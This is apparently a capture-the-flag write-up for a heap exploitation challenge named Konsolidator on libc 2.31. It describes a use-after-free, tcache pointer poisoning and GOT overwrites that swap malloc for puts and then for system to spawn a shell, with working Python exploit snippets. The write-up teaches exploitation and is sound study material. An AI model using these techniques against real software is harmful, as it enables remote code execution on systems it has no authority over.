# Konsolidator
```
1. Add chunk
2. Change chunk size
3. Delete chunk
4. Edit chunk
5. Exit
>> 
```

This challenge is a bare bones heap exploitation challenge with no frills.

Before you can do anything, a random number of randomly sized chunks are allocated.
After that, you can allocate, free, and edit up to 8 chunks of whatever size you can, but you can't read their contents.
The sizes of the chunks are saved and the reads properly use them.
Lastly, you can edit a chunk's size, this changes both the saved size used for reads, and the actual size saved on the heap, flag bits and all; but ***you can only do it once***.

Internally, the program saves the chunks and the sizes on the stack in 2 arrays:
```c
void* chunks[8];
size_t sizes[8];
```
# Vulnerability
Well obviously the fact that you can edit a chunk's size is already a vulnerability, but actually I didn't use that feature at all.

Here's what the `delete` function does:
```c
void delete(void** chunks) {
    int64_t idx;
	
    printf("Index\n>> ");
    scanf("%ld%*c", &idx);
    if (idx > -1 && idx < 8)
        free(chunks[idx]);
    else
        puts("Invalid index");
}
```

It doesn't set `chunks[idx]` to `NULL`, so we have a UAF (Use After Free).
This is the only vulnerability I leveraged for my exploit.

The program has no RELRO nor PIE, but it has canary and NX enabled.
It runs on libc 2.31.
# Attack
First of all, disclaimer: my solution is unintended, the intended solution is using House of Muneyz.
But who cares about House of XXX anyway!!

It can be a bit overwhelming at first to think about how to obtain RCE without leaks, my thought process when solving this challenge wasn't immediately to gain RCE, but to obtain more control and expand on what i could do. So here goes.

My first thought was to try and corrupt a tcache forward pointer, but we have no leaks, so where could we point it? We can't point it to the binary's memory, or at any specific address in general, since tcache fd's are mangled and we would need a heap leak, so the best we can do is to do a partial overwrite and move it somewhere else on the heap.
The program uses `fgets` to read our input so even if we sent nothing we'd set the pointer's lowest 2 bytes to 0x000a, which is already "guessy" considering ASLR, but 1 in 16 times (when the heap is at 0x...0000) this will point to the start of the heap + 10.

So let's do this and see where it takes us:
```python
io = conn()

malloc(io, 0, 0xf8)
malloc(io, 1, 0xf8)
free(io, 0)
free(io, 1)

edit(io, 1, b'')
malloc(io, 0, 0xf8)
malloc(io, 0, 0xf8) 
```

Let's assume that it **has** worked from now on (the exploit script retries until it does).
So we have an allocation near the start of the heap, what can we do? Well, the very first chunk on the heap contains the tcache, which is actually just a struct that looks a bit like this:
```c
struct tcache {
    uint16_t bin_counters[N_BINS];
    void*    first_chunk [N_BINS];
};
```

The `bin_counters` field contains the number of freed chunk in each bin, and the `first_chunk` field contains the pointer to the first chunk in the bin (it's a singly-linked list, each chunk has a pointer to the next one).

For reference for whoever uses pwndbg, if you run `bins` via pwndbg to check the tcache, you'll see something like this:
```c
tcachebins
0x60  [  2]: 0x55705a2bf280 —▸ 0x55705a2bf220
0x200 [  7]: 0x55705a2beea0 —▸ 0x55705a2beca0 —▸ 0x55705a2beaa0 —▸ 0x55705a2be8a0 —▸ 0x55705a2be6a0 —▸ 0x55705a2be4a0 —▸ 0x55705a2be2a0 ◂— 0x0
```

That counter in the \[brackets\] and the first pointer (leftmost) are taken straight from that struct. And the first pointer, unlike the next ones, is NOT mangled.
Knowing this, with an allocation on top of this struct we're be able to modify the counters and pointers, so we can just set all the counters to a high number and keep setting the pointer to wherever we wanna go. We have infinite arbitrary allocations!

I wrote a nice lambda for overwriting the tcache, which i actually only ended up using once:
```python
# offsets:
# at 6 there's the first tcache counter (tcache[0x20])
# at 134 there's the first tcache pointer (tcache[0x20])
# pointers = dict[size, ptr]
set_pointers = lambda pointers: edit(io, 0, flat({
	6: flat({ ((size-0x20)//0x10)*2: 0xffff for size in pointers.keys() }, word_size=16, filler=b'\0'),
	134: flat({ ((size-0x20)//0x10)*8: ptr for size, ptr in pointers.items() }, filler=b'\0')
}, filler=b'\0'))
```

*I don't think* having arbitrary write on the binary's memory is enough to open a shell, so let's get some leaks!

Looking at the function to allocate chunks:
```c
void add(void** chunks, size_t* sizes) {
    int64_t idx;
    size_t size;
	
    printf("Index\n>> ");
    scanf("%ld%*c", &idx);
    if (idx > -1 && idx < 8) {
        printf("Size\n>> ");
        scanf("%ld%*c", &size);
        chunks[idx] = malloc(size);
        sizes[idx] = size;
    } else
        puts("Invalid index");
}
```

We can see that it passes a user-controlled `size_t` to malloc, so an 8 byte number. This made me realize i could just change malloc's GOT entry to puts' PLT function, which gives us arbitrary read!
I used this to read a GOT entry to leak libc:
```python
set_pointers({ 0xa0: exe.got.malloc })
malloc(io, 1, 0x98)
edit(io, 1, p64(0x401040))

# read got[free] to leak libc
malloc(io, 2, exe.got.free)
recv_list.pop()
recv_all(io)
libc.address = u64(io.r(6).ljust(8, b'\0')) - libc.sym.free
aleak("libc", libc.address)
```

And then i just overwrote malloc's GOT entry again, this time with system, and passed it the address of the /bin/sh string as a size:
```python
edit(io, 1, p64(libc.sym.system))
malloc(io, 2, libc.binsh())
```

And we're done!
This was a very cool challenge in my opinion, i loved solving it, though i don't know if i would have enjoyed it nearly as much if i had to solve it the intended way, finding the House of XXX.